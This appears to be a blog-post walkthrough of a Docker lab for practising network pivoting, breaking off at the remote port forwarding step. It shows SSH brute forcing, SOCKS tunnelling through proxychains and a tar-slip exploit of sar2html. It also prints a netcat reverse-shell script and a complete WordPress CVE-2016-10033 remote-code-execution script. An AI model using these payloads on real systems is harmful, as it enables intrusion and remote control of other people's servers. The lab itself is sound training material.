I",Y<h2 id="pivoting">Pivoting…</h2>

<!-- excerpt-start -->
<p>You may be familiar with the concept of pivoting. Pivoting is the way to move from one comporised system<!-- excerpt-end --> to another system.
<br /></p>

<p>Suppose,
<br />
“A”  has access “B”.<br />
“B” has access “C”.<br />
“A” does not have access “C”.<br /></p>

<p>So how can we access “C” directly from “A”? Well, that’s direcly not possbile so we use the concept of pivoting. “A” can use “B” as the foothold to get access to “C”.
“A” first compromise the system “B” then can use this machine as the lauch point to attack the “C”.</p>

<h2 id="lab-creation-overview">Lab Creation Overview</h2>

<p>To have some practises on pivoting I created a lab in docker.</p>

<p>Figure below gives the overview of the network setup of the docker compose files.
Victim1 and Victim2 are our targets.They are on subnet <em>172.16.101.0/24</em>. Attacker is on different subnet <em>172.16.100.0/24</em>.</p>

<p>Our helper machine  ( gateway machine ) will sit on both subnetworks.</p>

<p><img src="/assets/img/blog4-pivoting/1-overview.png" alt=" pivoting image &gt;&lt;" /></p>

<p> </p>

<h3 id="brief-overview-of-docker-compose-files">Brief Overview of Docker Compose Files</h3>

<p>You can get the docker compose files from my github repo.</p>

<p>Github Link: <a href="https://github.com/Cimihan123/Pivoting">Repository</a></p>

<p>For this lab two networks  are created:-</p>

<ol>
  <li>
    <p><strong>attacker</strong> -&gt; having subnet <em>172.16.100.0/24</em></p>
  </li>
  <li>
    <p><strong>victim</strong> -&gt; having subnet <em>172.16.101.0/24</em></p>
  </li>
</ol>

<p>By default docker use bridge driver. We are sticking with it although we can specify different network drivers.</p>

<p><img src="/assets/img/blog4-pivoting/2-subnet.png" alt=" subnet image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose-subnet.yml</p>

<p> </p>

<p>Notice <em>helper</em> container is built locally. This will make easy as the base image will be customized rather than pulling everytime.</p>

<p>This container is part of the both networks: <em>attacker</em> and <em>victim</em>.</p>

<p><img src="/assets/img/blog4-pivoting/3-helper.png" alt=" helper image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p>A baseimage is being pulled.I have enabled ssh root login I don’t recommend doing this in your production environment or anywhere without proper security guidelines.XD</p>

<p><img src="/assets/img/blog4-pivoting/4-helper-image.png" alt=" helper image &gt;&lt;" /></p>
<p align="center">Fig: helper.Dockerfile</p>

<p><em>attacker</em> is the part of <em>attacker</em> subnet having an ip of <em>172.16.100.10</em></p>

<p><img src="/assets/img/blog4-pivoting/5-attacker.png" alt=" attacker image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p><em>attacker</em> container also uses the <em>phusion/baseimage</em>. Additionally some other tools ( ping, nmap etc ) will be installed.</p>

<p><img src="/assets/img/blog4-pivoting/5-attacker-image.png" alt=" attacker image &gt;&lt;" /></p>
<p align="center">Fig: attacker.Dockerfile</p>

<p><em>victim</em> container is also built locally. It does have network ip <em>172.16.101.10</em>. This is the part of subnet <em>172.16.101.0/24</em>.</p>

<p><img src="/assets/img/blog4-pivoting/6-victim1.png" alt=" victim1 image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p>I have installed <em>sar2html</em> Github Link: <a href="https://github.com/cemtan/sar2html/">Repository</a>.</p>

<p>It is the plotting tool for system statistics. There is an issue in this tool. We will discuss about this on different section. For now just assume there is a vulnerability in this tool.</p>

<p><img src="/assets/img/blog4-pivoting/6-victim1-image.png" alt=" victim1 image &gt;&lt;" /></p>
<p align="center">Fig: victim1.Dockerfile</p>

<p>For <em>victim2</em> there is no need to manipluate the image locally. There is already a vulnerable wordpress in docker hub. We just pull it from there. Below image show the structure to configure the wordpress as we also need a database server. They are in same subnetwork so they can communicate with each other.</p>

<p><img src="/assets/img/blog4-pivoting/7-victim2.png" alt=" victim2 image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<h3 id="running-and-checking">Running and Checking</h3>

<p>As far now we have brief overview of our lab enviroment. Now we run the docker compose files and check them.</p>

<p>We first build them. It may take some time for pulling, download and installing. Then we create and run the created containers.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class="nt">-f</span> docker-compose.yml build
docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class="nt">-f</span> docker-compose.yml up

</code></pre></div></div>

<p> </p>

<p>There are total of 5 containers running.Once <em>Attacker</em>, <em>helper</em>, <em>victim1</em> and <em>victim2</em> are running  we check the connection between them.</p>

<p><img src="/assets/img/blog4-pivoting/8-dockercompose.png" alt=" dockercomposeup image &gt;&lt;" /></p>
<p align="center">Fig: docker compose build &amp; up</p>

<p><em>attacker</em> container can reach the <em>helper</em> network.You see the successful ping reply back from the <em>helper</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping helper
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check from attacker </p>

<p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check from attacker </p>

<p>I guess you can figure it out from the below picture.</p>

<p><img src="/assets/img/blog4-pivoting/10-pingall.png" alt=" pinging from attacker to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check </p>

<h2 id="attacking-and-pivoting">Attacking and Pivoting</h2>

<p>Let’s first prefer discovering the ports in <em>helper</em> host.So our target is first to get access into the <em>helper</em> host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 172.16.100.11
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/11-nmap-helper.png" alt=" helper nmap scan &gt;&lt;" /></p>
<p align="center">Fig:nmap scan (helper) </p>

<p>So there is port 22 (ssh) open.We have hydra installed in the attacker machine and there is a rockyou.txt.
Bruteforcing the ssh login.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> root <span class="nt">-P</span> /home/rock.txt ssh://172.16.100.11
</code></pre></div></div>
<p> </p>

<p><img src="/assets/img/blog4-pivoting/12-hydra.png" alt=" bruteforce ssh &gt;&lt;" /></p>
<p align="center">Fig:Brutefore with Hydra </p>

<p>We got the password for the user <strong>root</strong>.Let’s try using this cred.So, we are now into the helper machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@172.16.100.11
</code></pre></div></div>
<p> </p>

<p><img src="/assets/img/blog4-pivoting/13-sshlogin.png" alt="  ssh login &gt;&lt;" /></p>
<p align="center">Fig:ssh login </p>

<p>There might be new hosts so I am going to scan further to gather new hosts and ports.</p>

<p><em>ifconfig</em> shows that the <em>helper</em> machine is the part of two netwwork family.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                1. 172.16.100.11
                                                2. 172.16.101.11
</code></pre></div></div>

<p><img src="/assets/img/blog4-pivoting/15-ifconfig.png" alt="  ifconfig &gt;&lt;" /></p>
<p align="center">Fig:ifconfig </p>

<p> </p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname -I -&gt; displays all the addresses for the host
</code></pre></div></div>

<p><img src="/assets/img/blog4-pivoting/16-hostname.png" alt="  hostname &gt;&lt;" /></p>
<p align="center">Fig:hostname </p>

<p> </p>

<p>Having ssh access makes very easy for tunneling.Creating dynamically port forwading leverages the SOCKS proxy.This will deliver all the trafic through ssh conncetion via given port to the destination server.Here we are forwading all the traffics to the attacker machine.</p>

<p><strong>-N = disable execution of command</strong></p>

<p><strong>-f = runs in background</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-D</span> 9050 root@172.16.100.11 <span class="nt">-f</span> <span class="nt">-N</span>
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/17-ssh-dynamic.png" alt="  dynamic &gt;&lt;" /></p>
<p align="center">Fig:dynamic port forwarding </p>

<p> </p>

<p>Cross checking if it is running in background or not.XD</p>

<p><img src="/assets/img/blog4-pivoting/17-1-netstat.png" alt="  netstat &gt;&lt;" /></p>
<p align="center">Fig:netstat </p>

<p>What we need now is a proxy tool.I am going to use <em>proxychains</em>.Remember the port we mentioned in “/etc/proxychains.conf” should be same as dynamic port.</p>

<p><img src="/assets/img/blog4-pivoting/18-proxychain.png" alt="  proxychain &gt;&lt;" /></p>
<p align="center">Fig:proxychain conf </p>

<h4 id="discovering-newer-hosts-victims">Discovering newer hosts (victims)</h4>

<p>The major concern is finding hosts.Having <em>nmap</em> would have been easier but mostly in real case scenerio you won’t find.</p>

<p><img src="/assets/img/blog4-pivoting/14-nonmap.png" alt="  no nmap &gt;&lt;" /></p>
<p align="center">Fig:no nmap </p>

<p>We are aware now that <em>helper</em> is the part of two networks.Both <em>helper</em> machine and <em>attacker</em> machine belong to same network “172.16.100.0/24”. Due to this reason we are now going to scan the network “172.16.101.0/24” to find all the live hosts.</p>

<p>Using ping sweep technique to scan a network host. The below one liner code will run in parallel mode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.101.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"64 bytes from"</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s2">"([0-9]{1,3}[</span><span class="se">\.</span><span class="s2">]){3}[0-9]{1,3}"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/19-loop-ping.png" alt="  ping scan hosts &gt;&lt;" /></p>
<p align="center">Fig:Host scan using ping </p>

<p>We have now gather total 5 live hosts.</p>

<p><strong>1. 172.16.101.11 - helper ip</strong><br />
<strong>2. 172.16.101.3  - gateway ip</strong><br />
<strong>3. 172.16.101.20 - victim1 ip</strong><br />
<strong>4. 172.16.101.21 - victim2 ip</strong><br />
<strong>5. 172.16.101.22 - victim2 ip</strong><br />
<br /></p>

<h3 id="victim1">Victim1</h3>

<p>The reason why we cannot ping is because proxies do not support icmp protcols.Their working OSI layers are different.
<img src="/assets/img/blog4-pivoting/20-proxy-ping-notworking.png" alt="  not working  &gt;&lt;" /></p>
<p align="center">Fig:Proxymap ping </p>

<p>We cannot ping the hosts however we can use nmap to scan ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-F</span> 172.16.101.20
</code></pre></div></div>

<p><strong>-sT - tcp connect scan</strong><br /></p>
<ul>
  <li><strong>-Pn - won’t scan hosts but treats all hosts as online</strong></li>
</ul>

<p>Nmap shows that one service is open on port 5000.</p>

<p><img src="/assets/img/blog4-pivoting/21-nmap.png" alt="  nmap victim1  &gt;&lt;" /></p>
<p align="center">Fig:Nmap scan (victim1) </p>

<p>We have 200 status code.
<img src="/assets/img/blog4-pivoting/22-curl.png" alt="  curl  &gt;&lt;" /></p>
<p align="center">Fig:Curl </p>

<p>Let’s see what is running in this port.Opening it in a browser.</p>
<blockquote>
  <p><strong>sar2html</strong> is the plotting tool for system statistics (sar data).</p>
</blockquote>

<p><img src="/assets/img/blog4-pivoting/23-sar2html.png" alt="  sar2html  &gt;&lt;" /></p>
<p align="center">Fig:Sar2html </p>

<p>As I said in the beginning of this blog there is a vunerability in this tool. Actually there is a tar2slip vulnerability.</p>
<blockquote>
  <p><strong>sar2html</strong> is vulnerable to tar slip which leads to arbitrary file write via archive extraction.</p>
</blockquote>

<p>Let’s just try exploiting it.</p>

<p><strong>1.First download the poc generator tool</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/ptoomey3/evilarc.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>evilarc  
</code></pre></div></div>
<p><strong>2.Run below code</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>exploitation <span class="nb">test</span> <span class="o">&gt;</span> test.css 
</code></pre></div></div>
<p><strong>3.Now generate the malicious tar file</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 evilarc.py  <span class="nt">-o</span> linux <span class="nt">-f</span> pay.tar test.css <span class="nt">-p</span> <span class="s1">'static/css'</span> <span class="nt">-d</span> 3
</code></pre></div></div>
<p><strong>4.Chick on “New Host” then upload the tar file “pay.tar”</strong></p>

<p><strong>5.Check the for the file.</strong></p>

<p><img src="/assets/img/blog4-pivoting/24-testcss.png" alt="  file.css check  &gt;&lt;" /></p>
<p align="center">Fig:Using Browswer </p>

<p><img src="/assets/img/blog4-pivoting/24-testcss1.png" alt="  file.css check using curl  &gt;&lt;" /></p>
<p align="center">Fig:Using Curl&gt;</p>
<p><br />
We have successfully exploitated this issue.
<br /></p>

<p>So we can say <strong>Victim1 is compromised</strong>.</p>

<h3 id="victim2">Victim2</h3>

<p>Again we start with the same tedious <em>nmap</em> scan. There is a http service running on port 80.</p>

<p><img src="/assets/img/blog4-pivoting/25-victim-nmap.png" alt="  wordpress nmap  &gt;&lt;" /></p>
<p align="center">Fig:Nmap scan (victim2)</p>

<p>Here we see mysql service running on.
<img src="/assets/img/blog4-pivoting/25-victim-nmap-mysql.png" alt="  mysql nmap  &gt;&lt;" /></p>
<p align="center">Fig:Nmap scan (victim2)</p>

<p>For now our taget is http service.</p>

<p>Seems like it is running a wordpress cms.</p>

<p><img src="/assets/img/blog4-pivoting/26-victim2-wp-curl.png" alt="  curl victim2  &gt;&lt;" /></p>
<p align="center">Fig:Check</p>

<p>Visit: http://172.16.101.21/wp-admin/install.php we have to first finish the wordpress install process.</p>

<p>Set username and password for the administration.Complete the process. Now we are ready to exploit the <em>RCE</em> vulnerability.</p>

<p>To know more about this vulnerability in wordpress, you can <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">Click Me</a>.</p>

<p><img src="/assets/img/blog4-pivoting/27-wordpress-install.png" alt="  wordpress installation  &gt;&lt;" /></p>
<p align="center">Fig:Wordpress Installation</p>

<p>Save the below reverses shell payload.Start the python http server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|sh <span class="nt">-i</span> 2&gt;&amp;1|nc 172.16.101.11 1331 <span class="o">&gt;</span>/tmp/f
</code></pre></div></div>

<p align="center">rev.sh</p>

<p>Now save the below poc and run it.Check if you have set correct http_server and target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c">#!/bin/bash</span>

<span class="k">function </span>prep_host_header<span class="o">()</span> <span class="o">{</span>
      <span class="nv">cmd</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
      <span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">"</span><span class="se">\$</span><span class="s2">{run{</span><span class="nv">$cmd</span><span class="s2">}}"</span><span class="p">;</span>
      <span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$rce_cmd</span> | <span class="nb">sed</span> <span class="s1">'s^/^\${substr{0}{1}{\$spool_directory}}^g'</span><span class="sb">`</span><span class="s2">"</span>
      <span class="nv">rce_cmd</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$rce_cmd</span> | <span class="nb">sed</span> <span class="s1">'s^ ^\${substr{10}{1}{\$tod_log}}^g'</span><span class="sb">`</span><span class="s2">"</span>
      <span class="nv">host_header</span><span class="o">=</span><span class="s2">"target(any -froot@localhost -be </span><span class="nv">$rce_cmd</span><span class="s2"> null)"</span>
      <span class="k">return </span>0
<span class="o">}</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Usage:</span><span class="se">\n</span><span class="nv">$0</span><span class="s2"> target-wordpress-url</span><span class="se">\n</span><span class="s2">"</span>
<span class="nb">exit </span>1
<span class="k">fi
</span><span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">http_server</span><span class="o">=</span><span class="s2">"172.16.101.11/rev.sh"</span>

<span class="c"># Save payload on the target in /tmp/rev.sh</span>
<span class="nv">cmd</span><span class="o">=</span><span class="s2">"/usr/bin/curl </span><span class="nv">$http_server</span><span class="s2"> -o /tmp/rev.sh"</span>
prep_host_header <span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>
curl <span class="nt">-H</span> <span class="s2">"Host: </span><span class="nv">$host_header</span><span class="s2">"</span> <span class="nt">-s</span> <span class="nt">-d</span> <span class="s1">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\e</span><span class="s2">[92m[+]</span><span class="se">\e</span><span class="s2">[0m Payload sent successfully"</span>

<span class="c"># get a reverse shell</span>
<span class="nv">cmd</span><span class="o">=</span><span class="s2">"/bin/chmod +x /tmp/rev.sh"</span>
prep_host_header <span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>
curl <span class="nt">-H</span> <span class="s2">"Host: </span><span class="nv">$host_header</span><span class="s2">"</span> <span class="nt">-s</span> <span class="nt">-d</span> <span class="s1">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\e</span><span class="s2">[92m[+]</span><span class="se">\e</span><span class="s2">[0m Payload sent successfully"</span>

<span class="nv">cmd</span><span class="o">=</span><span class="s2">"/bin/sh /tmp/rev.sh"</span>
prep_host_header <span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>
curl <span class="nt">-H</span> <span class="s2">"Host: </span><span class="nv">$host_header</span><span class="s2">"</span> <span class="nt">-s</span> <span class="nt">-d</span> <span class="s1">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">/wp-login.php?action=lostpassword"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\e</span><span class="s2">[92m[+]</span><span class="se">\e</span><span class="s2">[0m Payload sent successfully"</span>

</code></pre></div></div>
<p align="center">poc.sh</p>

<p><img src="/assets/img/blog4-pivoting/29-poc.png" alt="  poc.sh  &gt;&lt;" /></p>
<p align="center">Fig:poc.sh</p>

<h3 id="testing">Testing</h3>

<p>So before executing the poc file we have to first ensure that everything is working properly. Getting reverse shell directly from victim2 to attacker is not possible.Although we running dynamic port forwarding it is still not going to work.</p>

<p><img src="/assets/img/blog4-pivoting/30-nonc.png" alt=" check  &gt;&lt;" /></p>

<p><strong>poc.sh</strong> file downloads the <strong>rev.sh</strong> from the <strong>attacker</strong> machine to the <strong>victim2</strong> machine. But it is not making connection with the <strong>http server</strong>.</p>

<p><img src="/assets/img/blog4-pivoting/31-norev.png" alt=" check  &gt;&lt;" /></p>

<p>Let’s use the remote port forwarding concept here.</p>
:ET